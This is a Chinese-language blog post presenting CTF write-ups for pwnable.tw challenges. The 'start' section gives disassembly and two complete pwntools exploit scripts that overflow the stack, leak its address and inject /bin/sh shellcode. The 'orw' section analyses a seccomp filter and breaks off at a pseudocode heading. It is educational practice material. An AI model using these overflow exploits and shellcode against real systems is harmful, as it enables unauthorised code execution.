@@ -1,0 +1,2198 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="pwnable.tw练习 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>pwnable.tw练习 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">pwnable.tw练习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            pwnable.tw练习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,880</span> / Reading time: <span class="post-count">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure>
+<p>方法一:</p>
+<p>通过栈溢出控制eip指向0x08048087，从而泄露栈的地址，再次输入shellcode,控制eip指向shellcode即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#debug = int(raw_input(&quot;debug?:&quot;))</span><br><span class="line">debug = 0</span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./start&quot;)</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;chall.pwnable.tw&quot;, 10000)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">ebx</span><br><span class="line">ecx</span><br><span class="line">edx</span><br><span class="line">eax</span><br><span class="line">int 0x80</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">#attach(p, &quot;b *0x08048097&quot;)</span><br><span class="line">p.recvuntil(&quot;CTF:&quot;)</span><br><span class="line">p.sendline(&quot;a&quot; * 0x14 + p32(0x08048087))</span><br><span class="line"></span><br><span class="line">shell_addr = u32(p.recvn(4)) + 0x14</span><br><span class="line">print hex(shell_addr)</span><br><span class="line"># 由于某些原因，栈的地址和泄露出来的地址偏移不固定，通过 \x90，可以扩大eip指向shellcode的几率。</span><br><span class="line">p.sendline(&quot;a&quot; * 0x14 + p32(shell_addr) + &quot;\x90&quot; * 10 + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>方法二:</p>
+<ol>
+<li>通过控制eip到0x804808b,泄露栈的地址</li>
+<li>为了解除shellcode的长度限制，需要首先修改dl寄存器的值，扩大dl的值</li>
+<li>由于dl的值已经扩大，pwntools自带的shellcode也能读进去，但此时esp和读入的地址重合，首先需要修改esp的值，最终getshell</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line">context(os=&apos;linux&apos;, arch=&apos;i386&apos;, log_level=&apos;debug&apos;)</span><br><span class="line"></span><br><span class="line">GDB = 1</span><br><span class="line">if len(sys.argv) &gt; 2:</span><br><span class="line">    p = remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./start&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if GDB:</span><br><span class="line">        raw_input()</span><br><span class="line">    payload = p32(0x804808b) # write</span><br><span class="line">    p.recvuntil(&apos;CTF:&apos;)</span><br><span class="line">    payload = payload.rjust(0x14 + 4, &apos;\x00&apos;)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">    leak = u32(p.recv(0x18 + 4)[-4:]) # b0</span><br><span class="line">    shellcode1_addr = leak - (0xa0 - 0xb8)</span><br><span class="line">    shellcode2_addr = leak - (0x310 - 0x33c + 4) + 8</span><br><span class="line">    shellcode = asm(</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        mov dl, 0xff</span><br><span class="line">        ret</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    payload = payload.ljust(0x30 - 0x04, &apos;\x90&apos;)</span><br><span class="line">    assert len(payload) == 0x30 - 0x04</span><br><span class="line">    payload += p32(shellcode1_addr)</span><br><span class="line">    payload += p32(0x8048095)</span><br><span class="line">    payload += shellcode</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    payload = payload.ljust(0xf5c - 0xf14, &apos;\x00&apos;)</span><br><span class="line">    payload += p32(shellcode2_addr)</span><br><span class="line">    payload += asm(&quot;&quot;&quot;</span><br><span class="line">        sub esp, 0x100</span><br><span class="line">    &quot;&quot;&quot;)</span><br><span class="line">    payload += asm(shellcraft.sh())</span><br><span class="line">    p.send(payload)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>重要参考链接: <a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="external nofollow" target="_blank">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<p>参考链接: <a href="https://aryb1n.github.io/2017/10/15/pwnable-tw-orw/" rel="external nofollow" target="_blank">https://aryb1n.github.io/2017/10/15/pwnable-tw-orw/</a></p>
+<p>该程序启用了seccomp,可以通过三种方法查看:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned int orw_seccomp()</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; // [esp+4h] [ebp-84h]</span><br><span class="line">  char *v2; // [esp+8h] [ebp-80h]</span><br><span class="line">  char v3; // [esp+Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int v4; // [esp+6Ch] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u);</span><br><span class="line">  v1 = 12;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(0x26, 1, 0, 0, 0);</span><br><span class="line">  prctl(0x16, 2, &amp;v1);</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先看一下prctl方法:</p>
+<blockquote>
+<p>除了用prctl也可以用prctl的system call来进入这个模式</p>
+<p>这句话不太理解，以后再看。</p>
+</blockquote>
+<p>prctl第一个参数是option, 每个数字代表的含义在<code>/usr/include/linux/prctl.h</code>里可以找到, 这个<a href="http://man7.org/linux/man-pages/man2/prctl.2.html" rel="external nofollow" target="_blank">网站</a>有参考</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define PR_SET_NO_NEW_PRIVS    38</span><br><span class="line">#define PR_SET_SECCOMP    22</span><br></pre></td></tr></table></figure>
+<p>下面这个启用了seccomp沙盒模式, 第二个参数说明了沙盒类型<code>seccomp_mode_filter</code>相当于是设置了函数白名单, 具体filter了哪些函数, 看第三个参数, 第三个参数是个<code>struct sock_fprog</code>。</p>
+<p>再看看允许的函数吧:</p>
+<p>方法一: 使用seccomp-tools，方便快捷:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
+<p>可以看到，系统仅允许使用<code>rt_sigreturn</code>,<code>sigreturn</code>,<code>exit_group</code>,<code>exit</code>,<code>open</code>,<code>read</code>,<code>write</code>。</p>
+<p>方法二: 把从v3(offset = 0x640 ~ 0x6a0)这里开始的96字节数据dump下来, 然后看看是啥…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=orw of=orw_fprog bs=1 skip=1600 count=96</span><br></pre></td></tr></table></figure>
+<p>对照结构体查看:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct sock_fprog       /* Required for SO_ATTACH_FILTER. */</span><br><span class="line">&#123;</span><br><span class="line">        unsigned short          len;    /* Number of filter blocks */</span><br><span class="line">        struct sock_filter      *filter;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct sock_filter      /* Filter block */</span><br><span class="line">&#123;</span><br><span class="line">        __u16   code;   /* Actual filter code */</span><br><span class="line">        __u8    jt;     /* Jump true */</span><br><span class="line">        __u8    jf;     /* Jump false */</span><br><span class="line">        __u32   k;      /* Generic multiuse field */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>len就是12, 有12个block…每个8字节, 正好96字节, 我们看看sock_filter的内容,找资料说<code>libpcap</code>里有一个<code>bpf_image</code>函数可以那个把结构体解释成人类可解读的.</p>
+<p>首先安装：<code>apt-get install libpcap-dev</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;pcap.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    FILE * fp = fopen(&quot;./orw_fprog&quot;, &quot;r&quot;);</span><br><span class="line">    char buf1[100];</span><br><span class="line">    char buf2[1000];</span><br><span class="line">    struct bpf_insn aa[12];</span><br><span class="line">    fread(buf1, 1, 96, fp);</span><br><span class="line">    memcpy(aa, buf1, 96);</span><br><span class="line">    int i;</span><br><span class="line">    for(i = 0; i &lt; 12; i++) &#123;</span><br><span class="line">        printf(&quot;%s\n&quot;, bpf_image(&amp;aa[i], i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">// gcc -o unpack unpack.c -lpcap</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(000) ld       [4]</span><br><span class="line">(001) jeq      #0x40000003      jt 2    jf 11</span><br><span class="line">(002) ld       [0]</span><br><span class="line">(003) jeq      #0xad            jt 11    jf 4</span><br><span class="line">(004) jeq      #0x77            jt 11    jf 5</span><br><span class="line">(005) jeq      #0xfc            jt 11    jf 6</span><br><span class="line">(006) jeq      #0x1             jt 11    jf 7</span><br><span class="line">(007) jeq      #0x5             jt 11    jf 8</span><br><span class="line">(008) jeq      #0x3             jt 11    jf 9</span><br><span class="line">(009) jeq      #0x4             jt 11    jf 10</span><br><span class="line">(010) ret      #327718</span><br><span class="line">(011) ret      #2147418112</span><br></pre></td></tr></table></figure>
+<ul>
+<li>code是汇编指令</li>
+<li>jt是指令结果为true的跳转</li>
+<li>jf是指令结果为false的跳转</li>
+<li>k是指令的参数</li>
+</ul>
+<p>可以看出，允许的调用号为: 0xad,0x77,0xfc,0x1,0x5,0x3,0x4,也就是上边对应的7个函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_exit 1</span><br><span class="line">#define __NR_read 3</span><br><span class="line">#define __NR_write 4</span><br><span class="line">#define __NR_open 5</span><br></pre></td></tr></table></figure>
+<p>方法三:  参考链接: <a href="https://blog.csdn.net/qq_29343201/article/details/78109066" rel="external nofollow" target="_blank">https://blog.csdn.net/qq_29343201/article/details/78109066</a></p>
+<p>目前采用的方法是IDApython脚本dump数据下来，然后输入scmp_bpf_disasm。IDApython的文档非常诡异，函数没有说明，函数的参数也不能直接看出来，所以搜了很长时间找了一个别人的。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import idaapi</span><br><span class="line">start_address = 0x8048640</span><br><span class="line">data_length = 0x80486a0 - start_address</span><br><span class="line">data = idaapi.get_many_bytes(start_address, data_length)</span><br><span class="line">fp = open(&apos;C:\Users\HT\Desktop\orw.bpf&apos;, &apos;wb&apos;)</span><br><span class="line">print(data)</span><br><span class="line">fp.write(data)</span><br><span class="line">fp.close()</span><br><span class="line">print(&quot;done&quot;)</span><br></pre></td></tr></table></figure>
+<p>然后直接重定向至scmp_bpf_disasm：</p>
+<p>这软件也不知道怎么装的，哎，先算了。</p>
+<p>伪代码:</p>
